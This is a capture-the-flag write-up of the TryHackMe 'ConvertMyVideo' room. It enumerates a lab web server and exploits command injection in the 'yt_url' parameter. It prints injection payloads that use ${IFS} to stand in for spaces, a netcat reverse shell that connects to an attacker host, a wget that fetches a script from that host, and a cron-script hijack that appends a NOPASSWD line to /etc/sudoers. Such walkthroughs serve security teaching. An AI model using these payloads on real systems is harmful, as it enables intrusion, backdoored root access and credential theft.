# THM - ConvertMyVideo Writeup

> Mario Raciti | Nov 21, 2020
>
> TryHackMe CTF Room: https://tryhackme.com/room/convertmyvideo

### My Script to convert videos to MP3 is super secure

You can convert your videos - Why don't you check it out!

There is only one task, indicating that we have to get four information. So without any further ado, let's begin our game!

## Nmap Scan

Let's start this room by running a classic nmap scan:

```sh
$ nmap -sC -sV $IP -oN logs/nmap

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 16:01 CET
Nmap scan report for 10.10.162.165
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.91 seconds
```

Well, it seems we have only two open ports: `22 (SSH)` and `80 (HTTP)`.

## Web Directories Enumeration

Let's start by visiting the homepage of the web server listening on port 80. Although, by inspecting the source page it seems that there is nothing interesting.

### Gobuster

Since we didn't find any useful information, let's enumerate directories using Gobuster with the [common.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/common.txt) list:

```sh
$ gobuster dir --url $IP -w common.txt -o logs/gobuster.log

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.162.165
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/21 16:07:54 Starting gobuster in directory enumeration mode
===============================================================
/***secret_folder***  (Status: 401) [Size: 460]
/images               (Status: 301) [Size: 315] [--> http://10.10.162.165/images/]
/js                   (Status: 301) [Size: 311] [--> http://10.10.162.165/js/]    
/tmp                  (Status: 301) [Size: 312] [--> http://10.10.162.165/tmp/]   
                                                                                  
===============================================================
2020/11/21 16:08:07 Finished
===============================================================
```

As we can see, the tool found four directories: `/***secret_folder***`, `/images`, `/js` and `/tmp`.
We got the **first answer**: the name of the secret folder is `***secret_folder***`.

## Analyse HTTP Traffic

Since we can't access the pages we found using Gobuster, we can try to analyse and intercepting the HTTP request triggered by clicking the "Convert" button. For this purposes, we can use BurpSuite (or any other equivalent proxy-based tools).

Let's try to convert a non-existent video with *ID 23423* and send the request to Repeater:

```
POST / HTTP/1.1
Host: 10.10.162.165
Content-Length: 56
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.162.165
Referer: http://10.10.162.165/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

yt_url=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3D23423
```

## Command Injection

As we found that only the `yt_url` parameter is sent in the POST request, we can try to understand whether it is vulnerable to command injection. Thus, let's modify the value of the parameter before it will be sent by, for instance, replacing it with `;id;`:

```
POST / HTTP/1.1
Host: 10.10.162.165
Content-Length: 13
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.162.165
Referer: http://10.10.162.165/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

yt_url=;id;
```

We will get the following:

```
HTTP/1.1 200 OK
Date: Sat, 21 Nov 2020 15:53:57 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 486
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\nsh: 1: -f: not found\n","url_orginal":";id;","output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n","result_url":"\/tmp\/downloads\/5fb93815ed122.mp3"}
```

Bingo! The response return `"output":"uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"`, thereby it's vulnerable to command injection.

## Remote Code Execution (RCE)

We can now try to execute a reverse shell. There are several ways to do that, in this case we can opt for a simple netcat reverse shell. Let's write it down in a file:

```sh
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_IP> 4444 >/tmp/f
```

Now we have to upload the fileto the remote machine. In order to do such thing, we can simply run a Python server and downloa the file from the remote machine, exploiting the command injection:

```sh
attacker@machine:~$ python3 -m http.server 4343
```

And then, just posting the following HTTP request with Burp Repeater, which will "wget" our `rev_shell.sh` script:

```
POST / HTTP/1.1
Host: 10.10.162.165
Content-Length: 127
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.162.165
Referer: http://10.10.162.165/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

yt_url=;wget${IFS}<attacker_IP>:4343/rev_shell.sh;
```

*Caveat*: it's important to add the value of the special var IFS, `${IFS}`, as the space " " character replacement.

We will get the following response:

```
HTTP/1.1 200 OK
Date: Sat, 21 Nov 2020 16:33:46 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 840
Connection: close
Content-Type: text/html; charset=UTF-8

{"status":127,"errors":"WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nUsage: youtube-dl [OPTIONS] URL [URL...]\n\nyoutube-dl: error: You must provide at least one URL.\nType youtube-dl --help to see a list of all options.\n--2020-11-21 16:33:47--  http:\/\/10.9.117.97:4343\/rev_shell.sh\nConnecting to 10.9.117.97:4343... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 90 [application\/x-sh]\nSaving to: 'rev_shell.sh.1'\n\n     0K                                                       100%  359K=0s\n\n2020-11-21 16:33:47 (359 KB\/s) - 'rev_shell.sh' saved [90\/90]\n\nsh: 1: -f: not found\n","url_orginal":";wget${IFS}10.9.117.97:4343\/rev_shell.sh;","output":"","result_url":"\/tmp\/downloads\/5fb9416ac791a.mp3"}
```

Now we can just start a netcat listener on the attacker machine - make sure to choose the same port as specified in the script - by typing:

```sh
attacker@machine:~$ nc -lvnp 4444
```

And then execute the `rev_shell.sh` script by posting the following HTTP request:

```
POST / HTTP/1.1
Host: 10.10.162.165
Content-Length: 48
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.10.81.113
Referer: http://10.10.81.113/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

yt_url=;bash${IFS}rev_shell.sh;
```

Voilà! We now have a remote shell. Let's switch to a more comfortable shell by typing `/bin/bash -i`.

Now we can retrieve the user to access the secret folder by viewing `/***secret_folder***/.htpasswd`:

```sh
www-data@dmv:/var/www/html$ cat ***secret_folder***/.htpasswd
***user***:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
```

As a matter of fact, thanks to the reverse shell we killed two birds with a stone since we can also retrieve the **user flag**:

```sh
www-data@dmv:/var/www/html$ cat ***secret_folder***/flag.txt
***user_flag***
```

## Privilege Escalation

In order to get the root flag we have to elevate our privileges. If we go back to the directories enumeration step, we found also the `/tmp`. By looking inside it, we can discover a script called `clean.sh`:

```sh
www-data@dmv:/var/www/html$ cat tmp/clean.sh
rm -rf downloads
```

It could be a cron job, as the aim of the script would sugget. We can investigate about it by using [pspy](https://github.com/DominicBreuker/pspy). So let's upload it to the remote machine and execute it:

```sh
www-data@dmv:/var/www/html$ ./pspy64s

2020/11/21 17:31:42 CMD: UID=0    PID=1388   | 
2020/11/21 17:32:01 CMD: UID=0    PID=1392   | 
2020/11/21 17:32:01 CMD: UID=0    PID=1391   | bash /var/www/html/tmp/clean.sh 
2020/11/21 17:32:01 CMD: UID=0    PID=1390   | /bin/sh -c cd /var/www/html/tmp && bash /var/www/html/tmp/clean.sh 
2020/11/21 17:32:01 CMD: UID=0    PID=1389   | /usr/sbin/CRON -f 
```

Yeah! Here is the proof that we have a misconfigured cron job as the `clean.sh` script is scheduled to run regularly as *root* (UID=0), but `www-data` (our current user) is the owner. Thereby we can modify this script and elevate our privileges as follows:

```sh
www-data@dmv:/var/www/html$ echo "echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" > clean.sh
```

Now all we have to do is to wait for the next execution of the script and... voilà! Our user has finally **root permissions**:

```sh
www-data@dmv:/var/www/html$ sudo ls /root
root.txt
www-data@dmv:/var/www/html$ sudo cat /root/root.txt
***root_flag***
```

---

### That's all folks!
